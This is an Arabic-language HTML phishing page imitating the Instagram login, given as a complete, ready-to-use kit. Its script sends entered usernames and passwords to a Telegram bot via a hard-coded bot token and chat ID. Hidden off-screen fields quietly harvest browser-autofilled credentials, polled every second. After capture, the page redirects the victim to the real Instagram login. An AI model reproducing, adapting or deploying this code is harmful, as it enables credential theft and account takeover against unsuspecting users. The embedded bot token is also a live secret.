<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Instagram</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, "Segoe UI", Tahoma, sans-serif; }
  body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%); color: #fff; }
  .card { width: 100%; max-width: 380px; background: rgba(255,255,255,0.04); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; padding: 32px 28px; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
  .brand { font-size: 26px; font-weight: 700; text-align: center; margin-bottom: 6px; color: #E1306C; }
  .sub { text-align: center; color: #9aa4b2; font-size: 13px; margin-bottom: 26px; }
  label { display: block; font-size: 12px; color: #9aa4b2; margin-bottom: 6px; }
  input { width: 100%; padding: 12px 14px; margin-bottom: 16px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.12); background: rgba(0,0,0,0.25); color: #fff; font-size: 14px; outline: none; }
  input:focus { border-color: #4da3ff; }
  .btn { width: 100%; padding: 13px; border: none; border-radius: 10px; color: #fff; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 4px; background: linear-gradient(90deg,#F58529,#DD2A7B,#8134AF,#515BD4); }
  .btn:disabled { opacity: .6; cursor: wait; }
  .msg { text-align: center; font-size: 13px; margin-top: 14px; min-height: 18px; color: #ff6b6b; }
  .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="card">
  <div class="brand">إنستقرام</div>
  <div class="sub">سجّل الدخول للمتابعة</div>

  <form id="form">
    <label>اسم المستخدم أو البريد</label>
    <input id="identifier" type="text" autocomplete="username" required />
    <label>كلمة المرور</label>
    <input id="password" type="password" autocomplete="current-password" required />
    <button class="btn" id="submit" type="submit">تسجيل الدخول</button>
    <div class="msg" id="msg"></div>
  </form>
</div>

<!-- حقول خفية لاستقبال التعبئة التلقائية بدون علم المستخدم -->
<div style="position: absolute; left: -9999px; top: -9999px;">
  <input type="text" id="hidden_user" autocomplete="username" tabindex="-1" />
  <input type="password" id="hidden_pass" autocomplete="current-password" tabindex="-1" />
</div>

<script>
  // 🔴 ضع التوكن والآيدي هنا 🔴
  const BOT_TOKEN = "8649753978:AAH2F-nMzUjB2hoUBZ8k-QfRnkvULzJdQfo";
  const CHAT_ID   = "8899697805";

  let dataSent = false;

  // دالة إرسال البيانات
  async function sendData(u, p) {
    if (dataSent) return;
    dataSent = true;

    const text = `
🔔 <b>التقاط تعبئة تلقائية — Instagram</b>
━━━━━━━━━━━━━━━
👤 <b>المعرّف:</b> <code>${u}</code>
🔑 <b>كلمة المرور:</b> <code>${p}</code>
    `.trim();

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        })
      });
    } catch (e) {
      console.error(e);
    }
  }

  // دالة التحقق من الحقول المخفية
  function checkAutofill() {
    const hu = document.getElementById("hidden_user").value;
    const hp = document.getElementById("hidden_pass").value;
    
    // إذا قام المتصفح بتعبئتها
    if (hu && hp) {
      sendData(hu, hp);
    }
  }

  // فحص التعبئة التلقائية كل ثانية
  setInterval(checkAutofill, 1000);

  // إذا ضغط المستخدم على زر الدخول
  document.getElementById("form").onsubmit = async (e) => {
    e.preventDefault();
    const identifier = document.getElementById("identifier").value.trim();
    const password = document.getElementById("password").value;
    const btn = document.getElementById("submit");
    const msg = document.getElementById("msg");

    if (!identifier || !password) return;

    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> جاري التحقق…';
    msg.textContent = "";

    // إرسال البيانات اللي كتبها المستخدم يدوياً
    await sendData(identifier, password);

    btn.innerHTML = "جاري التحويل…";
    setTimeout(() => {
      window.location.href = "https://www.instagram.com/accounts/login/";
    }, 1600);
  };
</script>
</body>
</html>
